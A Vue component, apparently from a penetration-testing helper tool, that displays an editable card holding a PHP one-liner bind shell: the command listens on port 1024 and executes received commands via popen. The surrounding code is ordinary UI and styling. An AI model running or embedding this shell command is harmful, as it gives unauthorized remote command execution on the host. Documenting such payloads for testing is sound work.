<template>
    <div class="reverse">
        <el-card class="mainContent" :style="{ backgroundColor: isDark ? '#303030' : '#ecefff' }" shadow="always" @click="focusEditable">
            <div class="content">
                <span>🚀</span>
                <span ref="editable" contenteditable class="editable">php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",1024);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'</span>
            </div>
        </el-card>
    </div>
</template>

<script setup lang='js'>
import { ref } from 'vue'
import { useDark } from '@vueuse/core'
const isDark = useDark()

const editable = ref(null)

function focusEditable() {
    if (editable.value) {
        editable.value.focus()
    }
}
</script>

<style lang="scss" scoped>
.reverse {
    padding: 10px 0 0 20px;

    .mainContent {
        /* 其他样式 */
        cursor: text; /* 鼠标指针变为文本选择 */
    }

    .content {
        display: flex;
        align-items: flex-start; /* 确保文本在顶部对齐 */
    }

    .editable {
        outline: none; /* 移除编辑时的边框 */
        flex: 1; /* 使文本区域占据剩余空间 */
        word-break: break-word; /* 确保长单词换行 */
        white-space: pre-wrap; /* 保留空白符并换行 */
    }
}
</style>